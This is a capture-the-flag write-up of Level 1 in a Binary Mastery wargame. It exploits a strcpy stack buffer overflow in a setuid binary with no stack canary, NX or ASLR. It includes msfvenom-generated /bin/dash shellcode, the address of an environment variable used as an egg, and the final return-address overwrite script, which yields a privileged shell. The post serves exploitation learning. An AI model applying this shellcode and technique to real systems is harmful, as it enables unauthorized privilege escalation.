![Logo](/assets/images/belts-white.png)

At one point I _stumbled_  over the **Certified Secure Binary Mastery** challenges. 
They are not terribly difficult and _each one of them has an interesting element_. This makes them _accessible and fun_. 

In this blog posts and the following four I'll go through the [Ensign](https://www.certifiedsecure.com/certification/view/37) levels. As described, these ones deal with _retro exploitation techniques_ like buffer overflows, format strings, off-by-one errors and so on. No recent security mitigations are involved in the Ensign levels (E.g.: ASLR or non-executable stack). Don't worry too much about this yet, because their complexity increases to keep the hackers _in flow_. 

![Ensign](/assets/images/bm1.png)

**I hope it goes without saying that these blog posts shouldn't be used as a way to cheat yourself in any case, but as a learning oportunity. With this in mind, let's begin with _Level 1_**.

## 0 - Discovery

Let's connect to the server and check the binary we're dealing with:
```
$ ssh level1@hacking.certifiedsecure.com -p 8266
level1@hacking.certifiedsecure.com's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      
```

Let's see if we have any mitigation techniques using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally :
```bash
$ checksec.sh --file level1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   level1
```

Good signs: as expected NX is disabled and there is no stack canary. Let's verify that the stack is executable:
```
$ readelf -lW level1 | grep GNU_STACK
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
```

The R**W**E flag suggests Read-**Write**-Execute flags are all enabled. What about the state of ASLR on the system? Good news again: there is [no ASLR](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization), everything is static:
```bash
$ cat  /proc/sys/kernel/randomize_va_space
0
```

## 1 - Vulnerability

What we have here is a classic stack-based buffer overflow, caused by overflowing the 16-byte buffer _buf_ using the insecure function _strcpy_, which doesn't do any bounds checking:

```c
#include <stdio.h>                                                                                                 
#include <string.h>

void helloworld(char* name) {
    char buf[16];

    strcpy(buf, name);

    printf("Hello %s!\n", buf);
}

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Usage: %s <name>\n", argv[0]);
       
        return -1;
    }

    helloworld(argv[1]);

    return 0;
}
```

## 2 - Exploitation

By overwriting the return address from the function _helloworld_, we can redirect the execution of the program. We'll chose as destination _**a location on the stack containing our shellcode**_. Steps:
* Find the position that overwrites the return address.
* Generate _NULL-free_ shellcode for the correct architecture. Although the machine is 64-bit, the binaries are 32!
* Place the shellcode in an environment variable.
* Find the static address of the environment variable (No ASLR, remember?) and used it conjunction with step 1.

### Control the execution flow
Although  we can generally use tools from Metasploit Framework like _pattern_create_ and _pattern_offset_, in this case it is much simpler. We can just examine stack of the _helloworld_ function in IDA:

![helloworld stack](/assets/images/bm1-2.png)

So at dest+24 we have the saved EBP and at **dest+28** the saved return address. 

### Generate shellcode
We'll do this very easily from Kali. We can generate a payload to execute **/bin/dash** to ensure it will [not drop the SUID privileges](http://stackoverflow.com/questions/13209215/bin-sh-does-not-drop-privileges):
```bash
# msfvenom  -p linux/x86/exec CMD=/bin/dash -e x86/shikata_ga_nai -b '\x00' -f python
```

### Shellcode placement and location
Place the shellcode generated from MSF into a python script (_put-sc.py_ below) and place the output into an environment variable:

```python
buf =  ""                                                                                                          
buf += "\xda\xd7\xba\xb4\x13\x10\x12\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
buf += "\x0c\x31\x55\x18\x83\xed\xfc\x03\x55\xa0\xf1\xe5\x78\xc3\xad"
buf += "\x9c\x2f\xb5\x25\xb2\xac\xb0\x51\xa4\x1d\xb1\xf5\x35\x0a\x1a"
buf += "\x64\x5f\xa4\xed\x8b\xcd\xd0\xe7\x4b\xf2\x20\xd8\x29\x9b\x4e"
buf += "\x09\xca\x3a\xfc\x3d\x12\xea\x51\x34\xf3\xd9\xd6"

print "\x90"*30 + buf
```

```bash
$ export EGG=$(python /tmp/put-sc.py)
```

We still need to find out exactly where on the stack of our level1 binary will the environment variables reside. The easiest way to do this is to add an instruction to print the address of our environment variable and recompile level1.c **_on the target_**:

```c
 printf("EGG address: 0x%lx\n", getenv("EGG"));
 ```
 
 To compile files on the target we need to do it from the /tmp folder, or use a different TMPDIR variable, because we don't have write access in the current home folder, used by gcc for temporary files. Let's say we want to create another directory to be used as temporary folder for compilation:
 
 ```bash
$ mkdir /tmp/me
$ export TMPDIR=/tmp/me                                                                                            
$ gcc -m32 -fstack-protector -z execstack  /tmp/level1-mod.c -o /tmp/level1-mod
 ```
 
 Don't forget to use the same protection mechanisms (none!) as present in the original binary: no stack cookies (_-fnostackprotector_) and executable stack (_-z execstack_).
 
So the static address where the environment variable EGG will be located when running level1 is **0xffffd8c6**:

```bash
$ /tmp/level1-mod aaaaa
EGG address: 0xffffd8c6
Hello aaaaa!
```
## 3 - Profit

The following script generates the payload:

```python
#!/usr/bin/python                                                                                                  

import struct

# Address of environment variable containing shellcode
# Obtain this from findeggaddr.c
ret =  struct.pack("<L", 0xffffd8c6)

print "A" * 24 + ret*2
```

And we're in:
```bash
$ /levels/level1 $(python /tmp/expl.py)
Hello AAAAAAAAAAAAAAAAAAAAAAAA������!
$ id
uid=1002(level1) gid=1002(level1) euid=1003(level2) groups=1003(level2),1002(level1)
$ /home/level2/victory
   ___  _                      __  ___         __              
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                 _            /___/  
                             ___ ___  ___ (_)__ ____ 
                            / -_) _ \(_-</ / _ `/ _ \
                            \__/_//_/___/_/\_, /_//_/
                                          /___/      

Subject: Victory!

Congrats, you have solved level1. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level1 @ binary mastery ensign)
   * the exploit

You can now start with level2. If you want, you can log in
as level2 with password [REDACTED]
```

In the [next level](https://livz.github.io/2016/01/14/binary-master-ensign-2.html) we'll exploit another classic vulnerability, **uncontrolled string format**.
